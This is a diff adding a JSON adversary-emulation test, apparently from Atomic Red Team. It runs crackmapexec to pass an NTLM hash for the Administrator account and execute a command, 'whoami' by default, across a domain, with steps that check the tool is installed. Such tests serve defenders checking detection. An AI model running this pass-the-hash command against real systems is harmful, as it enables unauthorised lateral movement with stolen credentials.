@@ -1,0 +1,110 @@
+{
+  "id": "eb05b028-16c8-4ad8-adea-6f5b219da9a9",
+  "name": "crackmapexec Pass the Hash",
+  "description": "command execute with crackmapexec\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "b84b9995-a70d-47c0-926e-c0302c2b1488",
+      "type": "execute-command",
+      "data": {
+        "command": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "878a59ad-821f-4e48-9c92-991e6120efa0",
+      "name": "Check dependency 1/1",
+      "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "72fb53b5-162f-492a-8027-554b50c34b22",
+      "name": "Resolve dependency 1/1",
+      "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1a097aa6-14c6-4b87-b756-129ace7a2803",
+      "name": "Re-check dependency 1/1",
+      "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "878a59ad-821f-4e48-9c92-991e6120efa0",
+      "p": "on-success",
+      "o": "b84b9995-a70d-47c0-926e-c0302c2b1488"
+    },
+    {
+      "s": "878a59ad-821f-4e48-9c92-991e6120efa0",
+      "p": "on-failure",
+      "o": "72fb53b5-162f-492a-8027-554b50c34b22"
+    },
+    {
+      "s": "72fb53b5-162f-492a-8027-554b50c34b22",
+      "p": "on-success",
+      "o": "1a097aa6-14c6-4b87-b756-129ace7a2803"
+    },
+    {
+      "s": "1a097aa6-14c6-4b87-b756-129ace7a2803",
+      "p": "on-failure",
+      "o": "b84b9995-a70d-47c0-926e-c0302c2b1488"
+    }
+  ],
+  "tags": [
+    "T1550.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "user_name",
+      "type": "string",
+      "description": "username",
+      "value": "Administrator"
+    },
+    {
+      "name": "crackmapexec_exe",
+      "type": "path",
+      "description": "crackmapexec windows executable",
+      "value": "C:\\CrackMapExecWin\\crackmapexec.exe"
+    },
+    {
+      "name": "command",
+      "type": "string",
+      "description": "command to execute",
+      "value": "whoami"
+    },
+    {
+      "name": "ntlm",
+      "type": "string",
+      "description": "command",
+      "value": "cc36cf7a8514893efccd3324464tkg1a"
+    },
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "domain",
+      "value": "%userdnsdomain%"
+    }
+  ]
+}
